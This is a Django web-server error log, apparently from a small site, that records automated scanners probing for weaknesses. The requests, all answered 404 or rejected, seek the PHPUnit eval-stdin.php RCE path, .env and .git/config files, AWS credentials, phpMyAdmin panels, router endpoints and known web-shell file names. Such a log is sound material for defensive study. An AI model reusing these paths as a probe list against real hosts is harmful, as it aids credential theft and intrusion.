Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /wp-login.php
Not Found: /wp-login.php
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /wp-includes/ID3/license.txt
Not Found: /feed/
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /2021/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /_profiler/phpinfo
Not Found: /debug/default/view
Not Found: /config.json
Not Found: /.git/config
Not Found: /robots.txt
Not Found: /.env
Not Found: /.env
Invalid HTTP_HOST header: '142.93.161.32'. You may need to add '142.93.161.32' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '142.93.161.32'. You may need to add '142.93.161.32' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /shell
Not Found: /wp-login.php
Not Found: /contact.html
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Not Found: /.env_sample
Not Found: /.env.production.local
Not Found: /.env.testing
Not Found: /project/.git/config
Not Found: /.env.staging.local
Not Found: /.env.bak
Not Found: /cms/.git/config
Not Found: /media../.git/config
Not Found: /.git/config
Not Found: /.env.prod
Not Found: /prod/.env
Not Found: /.env.stage
Not Found: /build/.env
Not Found: /configuration/.env
Not Found: /.aws/credentials
Not Found: /.env.save
Not Found: /.env.test
Not Found: /.env.dev
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.git/config
Not Found: /.env
Not Found: /.env
Not Found: /libs/js/iframe.js
Not Found: /robots.txt
Not Found: /.env
Not Found: /contact/contact.html
Not Found: /download-video/
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /contact/index.html
Not Found: /.git/config
Not Found: /.git/config
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /static../.git/config
Not Found: /www/.git/config
Not Found: /.env.dist
Not Found: /.env.secret
Not Found: /build/.env
Not Found: /.env.testing
Not Found: /core/.git/config
Not Found: /.git/config
Not Found: /server/.git/config
Not Found: /.env.live
Not Found: /.env.test
Not Found: /.env.default
Not Found: /.env.config
Not Found: /config/.git/config
Not Found: /.env
Not Found: /.env.sandbox
Not Found: /dev/.git/config
Not Found: /.env.dev
Not Found: /.env.development.local
Not Found: /youtube-video-downloader/index.html/
Not Found: /db/websql/index.php
Not Found: /phpMyAdmin-latest-all-languages/index.php
Not Found: /administrator/phpMyAdmin/index.php
Not Found: /mysqlmanager/index.php
Not Found: /phpmyAdmin/index.php
Not Found: /php-myadmin/index.php
Not Found: /phpmyadmin2/index.php
Not Found: /_phpmyadmin_/index.php
Not Found: /db/phpMyAdmin-4/index.php
Not Found: /db/webadmin/index.php
Not Found: /phpMyAdmin-5/index.php
Not Found: /phpMyAdmin1/index.php
Not Found: /phpMyAdmin5.2/index.php
Not Found: /phpmy/index.php
Not Found: /phpMyAdmin-5.1.1/index.php
Not Found: /phpMyAdmin-5.1.3/index.php
Not Found: /phpMyAdmin-3/index.php
Not Found: /phpMyAdmin-5.2.0-all-languages/index.php
Not Found: /administrator/pma/index.php
Not Found: /phpMyAdmin-4/index.php
Not Found: /phpMyAdmin3/index.php
Not Found: /sql/sqladmin/index.php
Not Found: /phpmyadmin2017/index.php
Not Found: /MyAdmin/index.php
Not Found: /phpMyAdmin2/index.php
Not Found: /administrator/admin/index.php
Not Found: /sql/websql/index.php
Not Found: /db/phpMyAdmin3/index.php
Not Found: /phpmyadmin1/index.php
Not Found: /phpMyAdmin4/index.php
Not Found: /db/phpMyAdmin-3/index.php
Not Found: /phpmyadmin4/index.php
Not Found: /sql/phpmyadmin3/index.php
Not Found: /sql/phpmy-admin/index.php
Not Found: /phpMyAdmin_/index.php
Not Found: /administrator/db/index.php
Not Found: /phpMyAdmin-latest-english/index.php
Not Found: /database/index.php
Not Found: /phpmyadmin2021/index.php
Not Found: /program/index.php
Not Found: /sqlmanager/index.php
Not Found: /db/phpmyadmin5/index.php
Not Found: /mysql-admin/index.php
Not Found: /phpMyAdmin-latest/index.php
Not Found: /phpMyAdmin6/index.php
Not Found: /mysql/index.php
Not Found: /phpMyAdmin-5.1.2/index.php
Not Found: /db/myadmin/index.php
Not Found: /_phpmyadmin/index.php
Not Found: /phpMyAdmin6.0/index.php
Not Found: /phpMyAdmin-5.1.0/index.php
Not Found: /shopdb/index.php
Not Found: /pma/index.php
Not Found: /PMA/index.php
Not Found: /index.php
Not Found: /sql/sql/index.php
Not Found: /sql/php-myadmin/index.php
Not Found: /mysqladmin/index.php
Not Found: /1phpmyadmin/index.php
Not Found: /phpmyadmin2018/index.php
Not Found: /db/index.php
Not Found: /phpMyAdmin-4.9.7/index.php
Not Found: /db/webdb/index.php
Not Found: /phpMyAdmin-5.2.0/index.php
Not Found: /2phpmyadmin/index.php
Not Found: /sql/sqlweb/index.php
Not Found: /sql/myadmin/index.php
Not Found: /sql/phpmanager/index.php
Not Found: /db/phpMyAdmin-5/index.php
Not Found: /administrator/phpmyadmin/index.php
Not Found: /db/db-admin/index.php
Not Found: /phpmyadmin2022/index.php
Not Found: /administrator/PMA/index.php
Not Found: /sql/webadmin/index.php
Not Found: /mysql/mysqlmanager/index.php
Not Found: /db/phpmyadmin/index.php
Not Found: /mysql/pMA/index.php
Not Found: /phpmyadmin/index.php
Not Found: /mysql/web/index.php
Not Found: /mysql/pma/index.php
Not Found: /phpMyAdmin-5.2.1/index.php
Not Found: /phpmyadmin6/index.php
Not Found: /phpmyadmin2019/index.php
Not Found: /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
Not Found: /phpmy-admin/index.php
Not Found: /db/phpmyadmin3/index.php
Not Found: /db/phpMyAdmin/index.php
Not Found: /__phpmyadmin/index.php
Not Found: /sql/webdb/index.php
Not Found: /myadmin/index.php
Not Found: /db/phpmyadmin4/index.php
Not Found: /phpMyAdmin-5.2.1-all-languages/index.php
Not Found: /mysql/admin/index.php
Not Found: /phpMyAdmin-5.2/index.php
Not Found: /phpMyAdmin-5.2.1-english/index.php
Not Found: /mysql/db/index.php
Not Found: /php-my-admin/index.php
Not Found: /_phpMyAdmin/index.php
Not Found: /sql/phpmyadmin5/index.php
Not Found: /dbadmin/index.php
Not Found: /db/dbadmin/index.php
Not Found: /phpMyadmin/index.php
Not Found: /phpMyAdmin-4.9.10-all-languages/index.php
Not Found: /db/dbweb/index.php
Not Found: /phpmyadmin5/index.php
Not Found: /phpmyadmin_/index.php
Not Found: /phppma/index.php
Not Found: /sql/phpMyAdmin/index.php
Not Found: /mysql/dbadmin/index.php
Not Found: /sql/phpmyadmin4/index.php
Not Found: /phpMyAdmin/index.php
Not Found: /phpmyadmin3/index.php
Not Found: /administrator/web/index.php
Not Found: /phpMyAdmin5/index.php
Not Found: /mysql/sqlmanager/index.php
Not Found: /sql/phpMyAdmin2/index.php
Not Found: /phpmyadmin2020/index.php
Not Found: /phpMyAdmin5.1/index.php
Not Found: /sql/sql-admin/index.php
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /robots.txt
Not Found: /atom.xml
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/contact.html
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/index.html
Not Found: /.git/config
Not Found: /goform/formJsonAjaxReq
Not Found: /goform/formJsonAjaxReq
Not Found: /goform/formJsonAjaxReq
Not Found: /actuator/gateway/routes
Not Found: /api.config
Not Found: /aaa9
Not Found: /aab8
Not Found: /robots.txt
Not Found: /config.json
Not Found: /sitemaps.xml
Not Found: /robots.txt
Not Found: /.git/config
Not Found: /containers/json
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /sitemap.xml.gz
Not Found: /atom.xml
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/execute
Not Found: /.env
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env.stage
Not Found: /.env.template
Not Found: /dev/.git/config
Not Found: /assets../.git/config
Not Found: /files/.git/config
Not Found: /.env.dev.local
Not Found: /.env.dist
Not Found: /app/.git/config
Not Found: /.env.bak
Not Found: /.env.ci
Not Found: /goform/mcr_setWol
Not Found: /.env.default
Not Found: /.env.preprod
Not Found: /media../.git/config
Not Found: /config.json
Not Found: /.env.dev
Not Found: /robots.txt
Not Found: /contact.html
Not Found: /index.html
Not Found: /libs/js/iframe.js
Not Found: /contact.html
Not Found: /index.html
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: //pagead2.googlesyndication.com/pagead/js/adsbygoogle.js
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.git/config
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.git/config
Not Found: /sftp-config.json
Not Found: /.vscode/sftp.json
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /manager/html
Not Found: /robots.txt
Not Found: /api.conf
Not Found: /.well-known/security.txt
Not Found: /robots.txt
Not Found: /SDK/webLanguage
Not Found: /.git/index
Not Found: /config_files/.git/config
Not Found: /robots.txt
Not Found: /index.html
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.git/config
Not Found: /xmlrpc.php
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /aaa9
Not Found: /aab9
Not Found: /robots.txt
Not Found: /index.html
Not Found: /actuator/gateway/routes
Not Found: /wp-content/plugins/hellopress/wp_filemanager.php
Not Found: /403.php
Not Found: /content.php
Not Found: /wp-content/plugins/not/includes/about.php
Not Found: /wp-content/plugins/simple/simple.php
Not Found: /wp-content/plugins/wp-theme-editor/include.php
Not Found: /wp-content/themes/aahana/json.php
Not Found: /admin.php
Not Found: /wp-content/plugins/awesome-coming-soon/come.php
Not Found: /wp-content/plugins/wp-conflg.php
Not Found: /berlin.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/banners/about.php
Not Found: /wp-content/about.php
Not Found: /.well-known/about.php
Not Found: /wp-includes/Text/about.php
Not Found: /wp-includes/ID3/about.php
Not Found: /img/about.php
Not Found: /wp-content/languages/about.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-includes/IXR/about.php
Not Found: /wp-admin/js/about.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /wp-includes/pomo/about.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-content/updraft/about.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/includes/about.php
Not Found: /images/about.php
Not Found: /wp-content/blogs.dir/about.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-includes/about.php
Not Found: /cgi-bin/about.php
Not Found: /wp-content/gallery/about.php
Not Found: /wp-includes/blocks/about.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-admin/images/about.php
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/network/cloud.php
Not Found: /cloud.php
Not Found: /cgi-bin/cloud.php
Not Found: /wp-content/updates.php
Not Found: /css/cloud.php
Not Found: /wp-admin/user/cloud.php
Not Found: /img/cloud.php
Not Found: /wp-admin/css/colors/coffee/cloud.php
Not Found: /wp-admin/images/cloud.php
Not Found: /avaa.php
Not Found: /images/cloud.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-includes/Requests/Text/admin.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /wp-admin/cloud.php
Not Found: /updates.php
Not Found: /libraries/legacy/updates.php
Not Found: /libraries/phpmailer/updates.php
Not Found: /libraries/vendor/updates.php
Not Found: /alfa-rex.php7
Not Found: /alfanew.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-p.php7
Not Found: /wp-admin/repeater.php
Not Found: /wp-includes/repeater.php
Not Found: /wp-content/repeater.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-admin/js/about.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz1.php
Not Found: /cache-compat.php
Not Found: /ajax-actions.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /wp-consar.php
Not Found: /repeater.php
Not Found: /admin-post.php
Not Found: /wp-admin/maint/maint/ajax-actions.php
Not Found: /wp-admin/dropdown.php
Not Found: /wp-admin/css/index.php
Not Found: /dropdown.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /about.php7
Not Found: /alfanew.php7
Not Found: /adminfuns.php7
Not Found: /ebs.php7
Not Found: /ws.php7
Not Found: /alfanew2.php7
Not Found: /alfa-rex2.php7
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /wp-content/plugins/linkpreview/db.php
Not Found: /wp-content/themes/seotheme/db.php
Not Found: /wp-content/plugins/seoplugins/db.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /.well-known/pki-validation/xmrlpc.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-admin/network/xmrlpc.php
Not Found: /xmrlpc.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /css/xmrlpc.php
Not Found: /wp-admin/user/xmrlpc.php
Not Found: /img/xmrlpc.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /images/xmrlpc.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /wp-admin/xmrlpc.php
Not Found: /403.php
Not Found: /content.php
Not Found: /wp-content/plugins/not/includes/about.php
Not Found: /wp-content/plugins/simple/simple.php
Not Found: /wp-content/plugins/wp-theme-editor/include.php
Not Found: /wp-content/themes/aahana/json.php
Not Found: /admin.php
Not Found: /wp-content/plugins/awesome-coming-soon/come.php
Not Found: /wp-content/plugins/wp-conflg.php
Not Found: /berlin.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/banners/about.php
Not Found: /wp-content/about.php
Not Found: /.well-known/about.php
Not Found: /wp-includes/Text/about.php
Not Found: /wp-includes/ID3/about.php
Not Found: /img/about.php
Not Found: /wp-content/languages/about.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-includes/IXR/about.php
Not Found: /wp-admin/js/about.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /wp-includes/pomo/about.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-content/updraft/about.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/includes/about.php
Not Found: /images/about.php
Not Found: /wp-content/blogs.dir/about.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-includes/about.php
Not Found: /cgi-bin/about.php
Not Found: /wp-content/gallery/about.php
Not Found: /wp-includes/blocks/about.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-admin/images/about.php
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /.well-known/acme-challenge/cloud.php
